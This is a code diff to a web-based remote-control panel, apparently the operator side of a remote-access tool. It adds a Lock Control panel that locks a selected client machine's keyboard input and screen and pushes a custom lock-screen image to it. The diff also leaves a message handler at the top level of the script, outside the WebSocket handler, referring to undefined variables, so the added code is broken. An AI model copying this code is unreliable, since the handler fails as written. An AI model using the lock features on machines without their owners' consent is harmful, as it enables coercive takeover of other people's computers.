@@ -1023,6 +1023,134 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
   border-color: var(--accent);
 }
 
+/* ══ LOCK PANEL  ═════════════════════════════════════ */
+
+.lock-panel {
+  width: 0;
+  min-width: 0;
+  overflow: hidden;
+  background: var(--surf);
+  border-left: 1px solid transparent;
+  display: flex;
+  flex-direction: column;
+  transition: width .22s cubic-bezier(.4,0,.2,1), border-color .22s;
+}
+.lock-panel.open {
+  width: 380px;
+  min-width: 380px;
+  border-left-color: var(--border);
+}
+.lock-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 12px 16px;
+  border-bottom: 1px solid var(--border);
+  background: var(--surf2);
+}
+.lock-title {
+  font-family: var(--sans);
+  font-weight: 800;
+  font-size: 13px;
+  color: var(--accent);
+  letter-spacing: .12em;
+  text-transform: uppercase;
+}
+.lock-close {
+  background: none;
+  border: none;
+  color: var(--muted);
+  cursor: pointer;
+  font-size: 20px;
+  padding: 4px 8px;
+  transition: color .12s;
+  line-height: 1;
+}
+.lock-close:hover { color: var(--red); }
+.lock-content {
+  padding: 16px;
+  flex: 1;
+  overflow-y: auto;
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+}
+.lock-row {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+.lock-row label {
+  font-size: 11px;
+  font-weight: 600;
+  color: var(--muted);
+  text-transform: uppercase;
+}
+.lock-status {
+  font-size: 12px;
+  color: var(--text);
+  background: var(--surf2);
+  padding: 6px 10px;
+  border-radius: 4px;
+  border: 1px solid var(--border);
+}
+.lock-btn {
+  font-family: var(--mono);
+  font-size: 11px;
+  padding: 6px 12px;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  background: transparent;
+  color: var(--text);
+  cursor: pointer;
+  transition: all .12s;
+  margin-right: 8px;
+}
+.lock-btn:hover {
+  border-color: var(--accent);
+  color: var(--accent);
+}
+.lock-dropzone {
+  border: 2px dashed var(--border);
+  border-radius: 8px;
+  padding: 16px;
+  text-align: center;
+  cursor: pointer;
+  transition: all .12s;
+}
+.lock-dropzone:hover, .lock-dropzone.dragover {
+  border-color: var(--accent);
+  background: rgba(0,229,255,.05);
+}
+.lock-dropzone-icon { font-size: 24px; color: var(--muted); }
+.lock-dropzone-text { font-size: 11px; color: var(--muted); }
+.lock-preview {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  margin-top: 8px;
+}
+.lock-preview img {
+  max-width: 100px;
+  max-height: 60px;
+  border-radius: 4px;
+  border: 1px solid var(--border);
+}
+.lock-preview button {
+  background: var(--red);
+  border: none;
+  color: #fff;
+  width: 20px;
+  height: 20px;
+  border-radius: 10px;
+  cursor: pointer;
+  font-size: 12px;
+  line-height: 1;
+}
+.lock-actions {
+  display: flex;
+  justify-content: flex-end;
+}
 
 /* ══ OUTPUT LOG ═════════════════════════════════════ */
 .output-panel {
@@ -1067,6 +1195,7 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
     <button class="btn" id="taskBtn" onclick="toggleTaskManager()">⚙️ Tasks</button>
     <button class="btn" id="wallpaperBtn" onclick="toggleWallpaper()">🖼️ Wallpaper</button>
     <button class="btn" id="alertBtn" onclick="toggleAlertPanel()">🔔 Alert</button>
+    <button class="btn" id="lockBtn" onclick="toggleLockPanel()">🔒 Lock</button>
     <div class="divider"></div>
     <div class="stat-badge" id="fpsBadge">-- FPS</div>
     <div class="stat-badge" id="latBadge">-- ms</div>
@@ -1224,6 +1353,7 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
           <button class="tm-detail-btn danger" onclick="endSelectedTask()">🔴 End Task</button>
         </div>
       </div>
+      
     </div><!-- /task-manager-panel -->
 
     <!-- ══ WALLPAPER PANEL ══════════════════════════════ -->
@@ -1308,10 +1438,56 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
       </div>
     </div>
 
+
+    <!-- ══ LOCK PANEL ══════════════════════════════ -->
+    <div class="lock-panel" id="lockPanel">
+      <div class="lock-header">
+        <div class="lock-title">🔒 Lock Control</div>
+        <button class="lock-close" onclick="toggleLockPanel()">✕</button>
+      </div>
+      <div class="lock-content">
+        <!-- Upload ảnh khóa màn hình -->
+        <div class="lock-row">
+          <label>Lock Screen Image:</label>
+          <div class="lock-dropzone" id="lockDropzone"
+               onclick="document.getElementById('lockFileInput').click()"
+               ondragover="event.preventDefault(); this.classList.add('dragover')"
+               ondragleave="this.classList.remove('dragover')"
+               ondrop="onLockImageDrop(event)">
+            <div class="lock-dropzone-icon">📤</div>
+            <div class="lock-dropzone-text">Drag & drop or click to select</div>
+            <input type="file" id="lockFileInput" accept="image/*" style="display:none" onchange="onLockImageSelect(event)">
+          </div>
+          <div class="lock-preview" id="lockPreview" style="display:none;">
+            <img id="lockPreviewImg" src="" alt="Preview">
+            <button onclick="clearLockImage()">✕</button>
+          </div>
+        </div>
+
+        <!-- Trạng thái hiện tại -->
+        <div class="lock-row">
+          <label>Input:</label>
+          <span id="inputStatus" class="lock-status">Unknown</span>
+          <button class="lock-btn" onclick="lockInput(true)">Lock</button>
+          <button class="lock-btn" onclick="lockInput(false)">Unlock</button>
+        </div>
+        <div class="lock-row">
+          <label>Screen:</label>
+          <span id="screenStatus" class="lock-status">Unknown</span>
+          <button class="lock-btn" onclick="lockScreen(true)">Lock</button>
+          <button class="lock-btn" onclick="lockScreen(false)">Unlock</button>
+        </div>
+        <div class="lock-actions">
+          <button class="btn primary" onclick="setLockImage()" id="setLockImageBtn" disabled>Set as Lock Image</button>
+        </div>
+      </div>
+    </div>
+
+
   </div><!-- /workspace -->
 
 
-
+ 
 
 
   <!-- OUTPUT LOG -->
@@ -1328,6 +1504,12 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
 // ════════════════════════════════════════════════════════════
 //  STATE
 // ════════════════════════════════════════════════════════════
+
+
+let lockOpen = false;
+let lockImageFile = null;
+let lockImageBase64 = null;
+
 
 let selClient    = null;
 let isStreaming  = false;
@@ -1663,13 +1845,7 @@ function toggleExplorer() {
   document.getElementById('explorerPanel').classList.toggle('open',exOpen);
   document.getElementById('filesBtn').classList.toggle('files-active',exOpen);
   if(exOpen && selClient) { reqDrives(); navTo(exCurPath); }
-
-  if (exOpen)
-  {
-    tmOpen = false;
-    document.getElementById('taskManagerPanel').classList.remove('open');
-    document.getElementById('taskBtn').classList.remove('files-active');
-  }
+ 
 }
 
 
@@ -2051,7 +2227,6 @@ function toggleTaskManager() {
   const btn = document.getElementById('taskBtn');
   
   if (tmOpen) {
-    // Tắt File Manager nếu đang mở
     if (exOpen) {
       exOpen = false;
       document.getElementById('explorerPanel').classList.remove('open');
@@ -2469,7 +2644,145 @@ function closeAlert() {
   log('Close alert sent', 'info');
 }
 
+function toggleLockPanel() {
+  lockOpen = !lockOpen;
+  document.getElementById('lockPanel').classList.toggle('open', lockOpen);
+  document.getElementById('lockBtn').classList.toggle('files-active', lockOpen);
+  // Đóng các panel khác nếu cần
+  if (lockOpen) {
+    if (exOpen) toggleExplorer();
+    if (tmOpen) toggleTaskManager();
+    if (wpOpen) toggleWallpaper();
+    if (alertOpen) toggleAlertPanel();
+  }
+}
 
+function onLockImageDrop(e) {
+  e.preventDefault();
+  document.getElementById('lockDropzone').classList.remove('dragover');
+  const file = e.dataTransfer.files[0];
+  if (file) handleLockImageFile(file);
+}
+
+function onLockImageSelect(e) {
+  const file = e.target.files[0];
+  if (file) handleLockImageFile(file);
+}
+
+function handleLockImageFile(file) {
+  if (!file.type.startsWith('image/')) {
+    log('Please select an image file', 'error');
+    return;
+  }
+  lockImageFile = file;
+  const reader = new FileReader();
+  reader.onload = function(e) {
+    document.getElementById('lockPreviewImg').src = e.target.result;
+    document.getElementById('lockPreview').style.display = 'flex';
+    document.getElementById('setLockImageBtn').disabled = false;
+  };
+  reader.readAsDataURL(file);
+}
+
+function clearLockImage() {
+  lockImageFile = null;
+  document.getElementById('lockPreview').style.display = 'none';
+  document.getElementById('lockPreviewImg').src = '';
+  document.getElementById('setLockImageBtn').disabled = true;
+  document.getElementById('lockFileInput').value = '';
+}
+
+function setLockImage() {
+  if (!selClient) { log('Select a client', 'error'); return; }
+  if (!lockImageFile) return;
+  document.getElementById('setLockImageBtn').disabled = true;
+  sendLockImage(lockImageFile);
+}
+
+function sendLockImage(file) {
+  const tid = randId();
+  const CHUNK = 512 * 1024;
+  const total = Math.ceil(file.size / CHUNK) || 1;
+
+  // Tạo item trong transfer queue (tùy chọn)
+  mkXferItem(tid, file.name, file.size, 'up', 'Sending lock image...');
+
+  ws.send(JSON.stringify({
+    type: 'lock_image_upload_start',
+    client_id: selClient,
+    transfer_id: tid,
+    filename: file.name,
+    file_size: file.size,
+    total_chunks: total
+  }));
+
+  let chunkIdx = 0;
+  const sendNextChunk = async () => {
+    const start = chunkIdx * CHUNK;
+    const end = Math.min(start + CHUNK, file.size);
+    const chunk = file.slice(start, end);
+    const b64 = await readB64(chunk);
+    ws.send(JSON.stringify({
+      type: 'lock_image_chunk',
+      client_id: selClient,
+      transfer_id: tid,
+      chunk_idx: chunkIdx,
+      total_chunks: total,
+      data: b64
+    }));
+    xferProgress(tid, chunkIdx + 1, total);
+    chunkIdx++;
+    if (chunkIdx < total) {
+      setTimeout(sendNextChunk, 0);
+    } else {
+      ws.send(JSON.stringify({
+        type: 'lock_image_upload_done',
+        client_id: selClient,
+        transfer_id: tid,
+        filename: file.name,
+        file_size: file.size
+      }));
+      log(`Lock image upload complete`, 'info');
+    }
+  };
+  sendNextChunk();
+}
+
+function lockInput(lock) {
+  if (!selClient) { log('Select a client', 'error'); return; }
+  ws.send(JSON.stringify({
+    type: lock ? 'lock_input' : 'unlock_input',
+    client_id: selClient
+  }));
+  log(`Sent ${lock ? 'lock' : 'unlock'} input command`, 'info');
+}
+
+function lockScreen(lock) {
+  if (!selClient) { log('Select a client', 'error'); return; }
+  ws.send(JSON.stringify({
+    type: lock ? 'lock_screen' : 'unlock_screen',
+    client_id: selClient
+  }));
+  log(`Sent ${lock ? 'lock' : 'unlock'} screen command`, 'info');
+}
+
+// Có thể nhận phản hồi từ client về trạng thái (nếu client gửi lại)
+// Thêm vào ws.onmessage:
+if (type === 'lock_image_set_result') {
+  const {transfer_id, success, error} = msg;
+  const x = activeXfers[transfer_id];
+  if (x) {
+    if (success) {
+      setXferDone(transfer_id);
+      x.msg.textContent = '✅ Lock image saved';
+      log('Lock image updated', 'result');
+    } else {
+      x.fill.classList.add('err');
+      x.msg.textContent = '❌ ' + (error || 'Failed');
+      log('Lock image error: ' + error, 'error');
+    }
+  }
+}
 
 
 </script>
